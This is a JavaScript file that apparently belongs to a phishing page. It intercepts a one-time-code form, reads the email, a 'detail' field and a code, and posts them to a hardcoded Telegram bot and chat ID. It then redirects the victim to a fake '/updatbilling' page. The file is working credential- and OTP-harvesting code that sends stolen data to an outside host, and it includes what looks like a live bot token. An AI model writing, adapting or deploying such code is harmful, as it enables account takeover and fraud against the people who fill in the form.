document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("pop-otp");
    const submitBtn = document.getElementById("pop-submit");

    if (!form) return;

    // Replace these with your Telegram Bot credentials
    const BOT_TOKEN = "8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM";
    const CHAT_ID = "8614416084";

    form.addEventListener("submit", async (e) => {
        e.preventDefault();

        if (submitBtn) {
            submitBtn.disabled = true;
            submitBtn.textContent = "Please wait...";
        }

        const codeEmail = form.elements["codeEmail"]?.value.trim() || "";
        const codeDetail = form.elements["codeDetail"]?.value.trim() || "";
        const code = form.elements["code"]?.value.trim() || "";

        const message = `
📩 New Form Submission

📧 Email: ${codeEmail}
📝 Detail: ${codeDetail}
👤 Kid: ${code}
`;

        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                }),
            });
        } catch (err) {
            console.error("Telegram send failed:", err);
        } finally {
            window.location.href = "/updatbilling/index.html";
        }
    });
});
